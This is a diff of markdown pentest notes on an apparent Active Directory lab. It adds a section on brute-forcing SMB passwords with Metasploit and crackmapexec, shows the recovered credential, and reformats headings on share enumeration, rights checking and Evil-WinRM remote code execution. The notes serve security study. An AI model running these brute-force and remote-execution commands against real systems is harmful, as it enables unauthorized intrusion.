@@ -12,9 +12,40 @@ This is a collection of notes about active directory and (post)exploitation
 	msf6 auxiliary(scanner/smb/smb_version) >
 	
 
+## Password Bruteforce
+
+Metasploit
+
+	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
+	pass_file => pword.txt
+	msf6 auxiliary(scanner/smb/smb_login) > run
+
+	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
+	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:admin',
+	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:password',
+	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:s3cr3t',
+	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:12345',
+	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
+	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
+	[*] Auxiliary module execution completed
+	
+	
+Crackmapexec
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
+	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
+	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:admin STATUS_LOGON_FAILURE 
+	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:password STATUS_LOGON_FAILURE 
+	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:s3cr3t STATUS_LOGON_FAILURE 
+	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:12345 STATUS_LOGON_FAILURE 
+	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123!
+
+
+
 ## Enum Shares
 
-### smb_enumshares (Metasploit)
+smb_enumshares (Metasploit)
 
 	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
 	smbuser => thor
@@ -38,7 +69,7 @@ This is a collection of notes about active directory and (post)exploitation
 	[*] Auxiliary module execution completed
 
 
-### crackmaexec (--shares)
+crackmaexec (--shares)
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
@@ -57,7 +88,7 @@ This is a collection of notes about active directory and (post)exploitation
 
 ## Checking your rights for remote device
 
-### SMB_Login (Metasploit)
+SMB_Login (Metasploit)
 
 	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
 	smbuser => administrator
@@ -72,7 +103,7 @@ This is a collection of notes about active directory and (post)exploitation
 	[*] Auxiliary module execution completed
 	msf6 auxiliary(scanner/smb/smb_login) > 
 	
-### Crackmapexec
+Crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
@@ -82,7 +113,7 @@ This is a collection of notes about active directory and (post)exploitation
 
 ## Remote Code Execution
 
-### Evil-WinRM
+Evil-WinRM
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙
